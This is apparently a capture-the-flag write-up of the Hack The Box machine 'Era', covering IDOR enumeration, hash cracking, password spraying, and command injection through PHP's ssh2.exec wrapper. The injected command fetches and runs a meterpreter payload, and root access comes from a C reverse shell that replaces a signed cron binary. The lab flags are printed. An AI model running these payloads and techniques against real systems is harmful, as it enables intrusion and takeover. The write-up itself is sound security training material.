---
layout: default
title: Era
---

### Recon

we start with `nmap`, using this command:
```bash
nmap -p- -sVC --min-rate=10000 $target
```

![nmap results](image.png)

we can see port `21` for `ftp`, and port `80` for `nginx`, which holds http server.
```bash
┌──(agonen㉿kali)-[~/htb/Era]
└─$ nmap -p- -sVC --min-rate=10000 $target
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-23 17:44 EDT
Nmap scan report for 10.10.11.79
Host is up (0.17s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://era.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Let's add `era.htb` to our `/etc/hosts`:
```bash
10.10.11.79     era.htb
```

### Find hashes using IDOR and connect to ftp server as yuri

When navigating in the page, I didn't find anything interesting, so i checked for virtual hosts:
```bash
┌──(agonen㉿kali)-[~/htb/Era]
└─$ gobuster vhost -u http://era.htb/ --xs 400 --ad --wordlist /usr/share/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                       http://era.htb/
[+] Method:                    GET
[+] Threads:                   10
[+] Wordlist:                  /usr/share/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt
[+] User Agent:                gobuster/3.8
[+] Timeout:                   10s
[+] Append Domain:             true
[+] Exclude Hostname Length:   false
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
file.era.htb Status: 200 [Size: 6765]
```
I found `file.era.htb`, so i added this vhost to the `/etc/hosts`:
```bash
10.10.11.79     file.era.htb
```
And now we can start investigating this page.

![dashboard](image-1.png)

We can see this is uses `php`, so i used `gobuster` to enumerate files:
```bash
┌──(agonen㉿kali)-[~/htb/Era]
└─$ gobuster dir -u http://file.era.htb/ -x php -xl 6765 -w /usr/share/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://file.era.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] Exclude Length:          6765
[+] User Agent:              gobuster/3.8
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 178] [--> http://file.era.htb/images/]
/download.php         (Status: 302) [Size: 0] [--> login.php]
/login.php            (Status: 200) [Size: 9214]
/register.php         (Status: 200) [Size: 3205]
/files                (Status: 301) [Size: 178] [--> http://file.era.htb/files/]
/assets               (Status: 301) [Size: 178] [--> http://file.era.htb/assets/]
/upload.php           (Status: 302) [Size: 0] [--> login.php]
/layout.php           (Status: 200) [Size: 0]
/logout.php           (Status: 200) [Size: 70]
/manage.php           (Status: 302) [Size: 0] [--> login.php]
/LICENSE              (Status: 200) [Size: 34524]
/reset.php            (Status: 302) [Size: 0] [--> login.php]
```

The interesting endpoints right now is `register.php` and then `login.php`, because we can see all the other endpoints redirects to `login.php`, so it means we need to be logged in in order to be on those pages.

Let's create user, i created the user `elicopter770` with the password `elicopter770`.

![dashboard after logging in](image-2.png)

We play around, and found out that when we download, we go to this url: `http://file.era.htb/download.php?id=5924&dl=true`
Let's try to bruteforce the `id=5924`, maybe we'll find interesting finds.

So, first we need to create `numbers.txt` using this command:
```bash
seq 1 10000 > numbers.txt
```

Next, using `ffuf` we can do the bruteforce. don't forget to supply your PHPSESSID cookie. the `-fs` flag is to filter all the none special responses, i check before what is the size.

```bash
┌──(agonen㉿kali)-[~/htb/Era]
└─$ ffuf -w numbers.txt -u "http://file.era.htb/download.php?id=FUZZ&dl=true" --cookie="PHPSESSID=20hto9b745ln46tirjae199vl4" -fs 7686

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://file.era.htb/download.php?id=FUZZ&dl=true
 :: Wordlist         : FUZZ: /home/agonen/htb/Era/numbers.txt
 :: Header           : Cookie: PHPSESSID=20hto9b745ln46tirjae199vl4
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 7686
________________________________________________

150                     [Status: 200, Size: 2746, Words: 12, Lines: 9, Duration: 314ms]
54                      [Status: 200, Size: 2006697, Words: 7361, Lines: 7445, Duration: 154ms]
5924                    [Status: 200, Size: 48894, Words: 1, Lines: 10001, Duration: 788ms]
```

We find 2 interesting numbers, `150` and `54`. The other number is the file we uploaded.

let's go to `http://file.era.htb/download.php?id=54&dl=true` and to `http://file.era.htb/download.php?id=150&dl=true`.
the files are `signing.zip` and `site-backup-30-08-24.zip`.
```bash
┌──(agonen㉿kali)-[~/htb/Era]
└─$ ls
nmap.txt  numbers.txt  signing.zip  site-backup-30-08-24.zip
```

Then, we `unzip` using the commands:
```bash
unzip signing.zip -d signing
unzip site-backup-30-08-24.zip -d site-backup-30-08-24
```

Inside `site-backup-30-08-24` we can find `filedb.sqlite`, which is sqlite3 db.
I fetched the passwords
```bash
┌──(agonen㉿kali)-[~/htb/Era/site-backup-30-08-24]
└─$ sqlite3 filedb.sqlite
SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
sqlite> .tables
files  users
sqlite> select * from users;
1|admin_ef01cab31aa|$2y$10$wDbohsUaezf74d3sMNRPi.o93wDxJqphM2m0VVUp41If6WrYr.QPC|600|Maria|Oliver|Ottawa
2|eric|$2y$10$S9EOSDqF1RzNUvyVj7OtJ.mskgP1spN3g2dneU.D.ABQLhSV2Qvxm|-1|||
3|veronica|$2y$10$xQmS7JL8UT4B3jAYK7jsNeZ4I.YqaFFnZNA/2GCxLveQ805kuQGOK|-1|||
4|yuri|$2b$12$HkRKUdjjOdf2WuTXovkHIOXwVDfSrgCqqHPpE37uWejRqUWqwEL2.|-1|||
5|john|$2a$10$iccCEz6.5.W2p7CSBOr3ReaOqyNmINMH1LaqeQaL22a1T1V/IddE6|-1|||
6|ethan|$2a$10$PkV/LAd07ftxVzBHhrpgcOwD3G1omX4Dk2Y56Tv9DpuUV/dh/a1wC|-1|||
sqlite> .output users.txt
sqlite> select * from users;
```

Now, we can grab the users and hashes:
```bash
┌──(agonen㉿kali)-[~/htb/Era/site-backup-30-08-24]
└─$ cat users.txt | cut -d "|" -f2
admin_ef01cab31aa
eric
veronica
yuri
john
ethan
                                                                                                                                                 
┌──(agonen㉿kali)-[~/htb/Era/site-backup-30-08-24]
└─$ cat users.txt | cut -d "|" -f3 
$2y$10$wDbohsUaezf74d3sMNRPi.o93wDxJqphM2m0VVUp41If6WrYr.QPC
$2y$10$S9EOSDqF1RzNUvyVj7OtJ.mskgP1spN3g2dneU.D.ABQLhSV2Qvxm
$2y$10$xQmS7JL8UT4B3jAYK7jsNeZ4I.YqaFFnZNA/2GCxLveQ805kuQGOK
$2b$12$HkRKUdjjOdf2WuTXovkHIOXwVDfSrgCqqHPpE37uWejRqUWqwEL2.
$2a$10$iccCEz6.5.W2p7CSBOr3ReaOqyNmINMH1LaqeQaL22a1T1V/IddE6
$2a$10$PkV/LAd07ftxVzBHhrpgcOwD3G1omX4Dk2Y56Tv9DpuUV/dh/a1wC
```

let's use `john` to crack the password. after crack, we get these results:
```bash
┌──(agonen㉿kali)-[~/htb/Era]
└─$ john hashes.txt --show
?:america
?:mustang

2 password hashes cracked, 4 left
```

So, two passwords got cracked, but we don't know who's password is this. Let's use BurpSuite to spray the passwords all over the users. we'll use cluster bomb mode:

![burp suite](image-3.png)

We can see that two attempts gave `302`, which means successful login:
```bash
yuri \ mustang
eric \ america
```

![results burp spraying attack](image-4.png)

we got have done the same thing using `ffuf`, with two payloads:
```bash
┌──(agonen㉿kali)-[~/htb/Era]
└─$ ffuf -w user_only.txt:USER -w crack_password.txt:PASS -u http://file.era.htb/login.php -X POST -H "Content-Type: application/x-www-form-urlencoded" \
-d "submitted=true&username=USER&password=PASS" -mc 302

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://file.era.htb/login.php
 :: Wordlist         : USER: /home/agonen/htb/Era/user_only.txt
 :: Wordlist         : PASS: /home/agonen/htb/Era/crack_password.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : submitted=true&username=USER&password=PASS
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 302
________________________________________________

[Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 393ms]
    * PASS: america
    * USER: eric

[Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 893ms]
    * PASS: mustang
    * USER: yuri

:: Progress: [12/12] :: Job [1/1] :: 15 req/sec :: Duration: [0:00:01] :: Errors: 0 ::
```

When we try to login to the `ftp` server, only `yuri` works for us:
```bash
ftp yuri@$target
```

![yuri login successful](image-5.png)

### Exploit IDOR to access admin panel

when we are logged on to some user, we can reset his security questions.

![reset sec questions](image-6.png)

However, we can try to send username of other users, for example, from this list, and then reset their security questions:
```bash
admin_ef01cab31aa
eric
veronica
yuri
john
ethan
```
Let's change the answers to all security questions of `admin_ef01cab31aa` to bob.

![reset admin security questions](image-7.png)

Now we can access as an admin

![login as admin](image-8.png)

![login successful](image-9.png)

### Get reverse shell using vulnerable code in download.php

I simply dumped the whole ftp server files using `wget`:
```bash
┌──(agonen㉿kali)-[~/htb/Era]
└─$ wget -m ftp://yuri:mustang@$target:21/
```

we can see inside `php8.1_conf` that it has the `ssh2.so` module, it will be very helpful later on.
```bash
┌──(agonen㉿kali)-[~/htb/Era/10.10.11.79]
└─$ ls php8.1_conf   
build        dom.so   fileinfo.so  iconv.so    pdo_sqlite.so  readline.so   sockets.so  sysvmsg.so  tokenizer.so  xmlwriter.so
calendar.so  exif.so  ftp.so       opcache.so  phar.so        shmop.so      sqlite3.so  sysvsem.so  xmlreader.so  xsl.so
ctype.so     ffi.so   gettext.so   pdo.so      posix.so       simplexml.so  ssh2.so     sysvshm.so  xml.so        zip.so
```

Now, let's give a quick look again over `download.php`:
```php
// Allow immediate file download
        if ($_GET['dl'] === "true") {

                header('Content-Type: application/octet-stream');
                header("Content-Transfer-Encoding: Binary");
                header("Content-disposition: attachment; filename=\"" .$fileName. "\"");
                readfile($fetched[0]);
        // BETA (Currently only available to the admin) - Showcase file instead of downloading it
        } elseif ($_GET['show'] === "true" && $_SESSION['erauser'] === 1) {
                $format = isset($_GET['format']) ? $_GET['format'] : '';
                $file = $fetched[0];

                if (strpos($format, '://') !== false) {
                        $wrapper = $format;
                        header('Content-Type: application/octet-stream');
                } else {
                        $wrapper = '';
                        header('Content-Type: text/html');
                }

                try {
                        $file_content = fopen($wrapper ? $wrapper . $file : $file, 'r');
                        $full_path = $wrapper ? $wrapper . $file : $file;
                        // Debug Output
                        echo "Opening: " . $full_path . "\n";
                        echo $file_content;
                } catch (Exception $e) {
                        echo "Error reading file: " . $e->getMessage();
                }
        } 
```

As we can see, there is some special logic for admin user, that we owned, which let's him execute this line:
```php
$file_content = fopen($wrapper ? $wrapper . $file : $file, 'r');
```

Then, we can read this paper https://www.php.net/manual/en/wrappers.ssh2.php about `ssh2` wrappers. In manner way, we can use wrapper like this pattern to execute command:
```bash
ssh2.exec://user:pass@example.com:22/usr/local/bin/somecmd
```

this will be the payload we are gonna give to test if it's working:
```bash
ssh2.exec://yuri:mustang@localhost:22/curl http://10.10.16.49:8081/GET_ME;%23
```
basically, we connect to local ssh using the credentials of `yuri`, which probably are the same in the `ftp` and `ssh` services.
Then, we execute some command to test if we can access our attacker machine. the `%23` is decoded to `#`, and meant to "comment" the rest of the appending, which is `files/signing.zip`.

![testing working](image-10.png)

Now, let's start build our payload using `Metasploit`:

* Create payload using `msfvenom`:

we create `elf` file that is going to be the file we execute on the victim machine.
As you can see, i supplied the payload `linux/x86/meterpreter/reverse_tcp`, and also my attcker IP and machine.
We need to set the same arguments in our msfconsole.

```bash
┌──(agonen㉿kali)-[~/htb/Era]
└─$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.16.49 LPORT=1337 -f elf --out reverse_meterpreter
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 123 bytes
Final size of elf file: 207 bytes
Saved as: reverse_meterpreter
```

* Create listener in our `msfconsole`:

first, execute `msfconsole` to start the tool.
next, we want to use the `exploit/multi/handler` module.

```bash
msf > use exploit/multi/handler
```

Now, we need to set the payload, we can use `show options` to see what we need to set.
```bash
msf exploit(multi/handler) > set LHOST 10.10.16.49
LHOST => 10.10.16.49
msf exploit(multi/handler) > set LPORT 1337
LPORT => 1337
msf exploit(multi/handler) > set payload linux/x86/meterpreter/reverse_tcp
payload => linux/x86/meterpreter/reverse_tcp
```

Now, we can execute the exploit, the flag `-j` is for job, to run in the background. the flag `-z` is for no interact, no interaction with session after successful connection. I want to rule it on my own.
```bash
msf exploit(multi/handler) > exploit -j -z 
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
msf exploit(multi/handler) > 
[*] Started reverse TCP handler on 10.10.16.49:1337 
```

* Upload `reverse_meterpreter` to the victim machine and execute

We want to execute this:
```bash
curl http://10.10.16.49:8081/reverse_meterpreter -o /tmp/reverse_meterpreter; chmod +x /tmp/reverse_meterpreter; /tmp/reverse_meterpreter
```

Okay, the idea is to do something like:
```bash
echo "base64encodedstring" | base64 -d | bash; 
```

So, we need to encode our payload:
```bash
Y3VybCBodHRwOi8vMTAuMTAuMTYuNDk6ODA4MS9yZXZlcnNlX21ldGVycHJldGVyIC1vIC90bXAvcmV2ZXJzZV9tZXRlcnByZXRlcjsgY2htb2QgK3ggL3RtcC9yZXZlcnNlX21ldGVycHJldGVyOyAvdG1wL3JldmVyc2VfbWV0ZXJwcmV0ZXI=
```

and now URL encode the full command:
```bash
echo+Y3VybCBodHRwOi8vMTAuMTAuMTYuNDk6ODA4MS9yZXZlcnNlX21ldGVycHJldGVyIC1vIC90bXAvcmV2ZXJzZV9tZXRlcnByZXRlcjsgY2htb2QgK3ggL3RtcC9yZXZlcnNlX21ldGVycHJldGVyOyAvdG1wL3JldmVyc2VfbWV0ZXJwcmV0ZXI=%3d+|+base64+-d+|+bash;%23
```
this is our full payload:
```bash
ssh2.exec://yuri:mustang@localhost:22/echo+Y3VybCBodHRwOi8vMTAuMTAuMTYuNDk6ODA4MS9yZXZlcnNlX21ldGVycHJldGVyIC1vIC90bXAvcmV2ZXJzZV9tZXRlcnByZXRlcjsgY2htb2QgK3ggL3RtcC9yZXZlcnNlX21ldGVycHJldGVyOyAvdG1wL3JldmVyc2VfbWV0ZXJwcmV0ZXI=%3d+|+base64+-d+|+bash;%23
```

![sending payload](image-11.png)

Now, let's go to the msfconsole, we can see there is connection:

![get connection](image-12.png)

* Working with sessions

Now, in order to view the sessions, we can execute `sessions -l`:
```bash
msf exploit(multi/handler) > sessions -l

Active sessions
===============

  Id  Name  Type                   Information         Connection
  --  ----  ----                   -----------         ----------
  1         meterpreter x86/linux  yuri @ 10.10.11.79  10.10.16.49:1337 -> 10.10.11.79:53576 (10.10.11.79)

```

If we want to interact with the session, we can execute `sessions -i 1`:
```bash
msf exploit(multi/handler) > sessions -i 1
[*] Starting interaction with 1...

meterpreter >
```

Now, we can execute the command `shell` and achieve our shell!

![get shell](image-13.png) 

And now let's stabilize the shell:
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
stty raw -echo
stty rows 38 columns 116
```

Next, we want the user flag. we can't find it in our dir, so it's probably in `eric` dir.
We can easily `su` to `eric` with his password, `america`, which we discoverd earlier.

```bash
yuri@era:~$ ls /home
eric  yuri
yuri@era:~$ ls /home/eric
ls: cannot open directory '/home/eric': Permission denied
yuri@era:~$ su eric
Password: america

eric@era:/home/yuri$ cd ~
eric@era:~$ ls
user.txt
eric@era:~$ cat user.txt
5b87cb9bbf09bbac226e02ba80830225
```

### Privilege Escalation to Root

we can see using `id` that eric is in the group `devs`.
```bash
eric@era:~$ id
uid=1000(eric) gid=1000(eric) groups=1000(eric),1001(devs)
```

when we search for files in this group using `find`, these are the files we get:
```bash
eric@era:~$ find / -group devs 2>/dev/null  
/opt/AV
/opt/AV/periodic-checks
/opt/AV/periodic-checks/monitor
/opt/AV/periodic-checks/status.log
```

We can see the `monitor`, which is owned by `root`.
I uploaded `pspy`, and then executed to see which processes are running:

![pspy result](image-14.png) 

```bash
025/10/24 12:03:01 CMD: UID=0     PID=11133  | /usr/sbin/CRON -f -P 
2025/10/24 12:03:01 CMD: UID=0     PID=11136  | bash -c echo > /opt/AV/periodic-checks/status.log 
2025/10/24 12:03:01 CMD: UID=0     PID=11135  | /bin/sh -c bash -c 'echo > /opt/AV/periodic-checks/status.log' 
2025/10/24 12:03:01 CMD: UID=0     PID=11137  | /bin/sh -c bash -c '/root/initiate_monitoring.sh' >> /opt/AV/periodic-checks/status.log 2>&1 
2025/10/24 12:03:01 CMD: UID=0     PID=11138  | /bin/bash /root/initiate_monitoring.sh 
2025/10/24 12:03:01 CMD: UID=0     PID=11139  | objcopy --dump-section .text_sig=text_sig_section.bin /opt/AV/periodic-checks/monitor 
2025/10/24 12:03:01 CMD: UID=0     PID=11140  | /bin/bash /root/initiate_monitoring.sh 
2025/10/24 12:03:01 CMD: UID=0     PID=11141  | openssl asn1parse -inform DER -in text_sig_section.bin 
2025/10/24 12:03:01 CMD: UID=0     PID=11142  | /bin/bash /root/initiate_monitoring.sh 
2025/10/24 12:03:01 CMD: UID=0     PID=11144  | grep -oP (?<=UTF8STRING        :)Era Inc. 
2025/10/24 12:03:01 CMD: UID=0     PID=11147  | /bin/bash /root/initiate_monitoring.sh 
```

As you can see, there is some cronjob that is running, which execute the `monitor`. 
Also, it takes the segment `.text_sig` from `monitoer`, and put it inside `text_sig_section.bin`.
```bash
objcopy --dump-section .text_sig=text_sig_section.bin /opt/AV/periodic-checks/monitor 
```
Later, it checks using openssl the file `text_sig_section.bin`, which is probably some signature file.
```bash
openssl asn1parse -inform DER -in text_sig_section.bin 
```
at the end it deletes `text_sig_section.bin`, but it isn't shown here.

Okay, let's upload our reverse shell, we'll use again https://www.revshells.com/.
```C
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(void){
    int port = 770;
    struct sockaddr_in revsockaddr;

    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    revsockaddr.sin_family = AF_INET;       
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr("10.10.16.49");

    connect(sockt, (struct sockaddr *) &revsockaddr, 
    sizeof(revsockaddr));
    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);

    char * const argv[] = {"sh", NULL};
    execvp("sh", argv);

    return 0;       
}
```

compile the file:
```bash                                                                                                                                                           
┌──(agonen㉿kali)-[~/htb/Era]
└─$ gcc rev_shell.c -o rev_shell 
```

And after uploading, we backup the old `monitor`, and put our reverse_shell as monitor:
```bash
eric@era:/opt/AV/periodic-checks$ mv monitor monitor_backup
eric@era:/opt/AV/periodic-checks$ mv rev_shell-SuabsIKu monitor
eric@era:/opt/AV/periodic-checks$ ls -la
total 48
drwxrwxr-- 2 root devs  4096 Oct 24 12:20 .
drwxrwxr-- 3 root devs  4096 Jul 22 08:42 ..
-rwxrwxr-x 1 eric eric 16216 Oct 24 12:19 monitor
-rwxrw---- 1 root devs 16544 Oct 24 12:20 monitor_backup
-rw-rw---- 1 root devs   307 Oct 24 12:20 status.log
```

We want also to add the same `text_sig_section.bin` to our file, so let's do this:
```bash
objcopy --dump-section .text_sig=text_sig_section.bin /opt/AV/periodic-checks/monitor_backup
objcopy --add-section .text_sig=text_sig_section.bin /opt/AV/periodic-checks/monitor /opt/AV/periodic-checks/monitor 
```

![add signature](image-15.png)

And now we just wait...
```bash
┌──(agonen㉿kali)-[~/htb/Era]
└─$ nc -nvlp 770
listening on [any] 770 ...
connect to [10.10.16.49] from (UNKNOWN) [10.10.11.79] 56164
id
uid=0(root) gid=0(root) groups=0(root)
cat /root/root.txt
8458ba19b1730c50a8e1fac016f66aad
```

**User Flag:*****`5b87cb9bbf09bbac226e02ba80830225`***

**Root Flag:*****`8458ba19b1730c50a8e1fac016f66aad`***
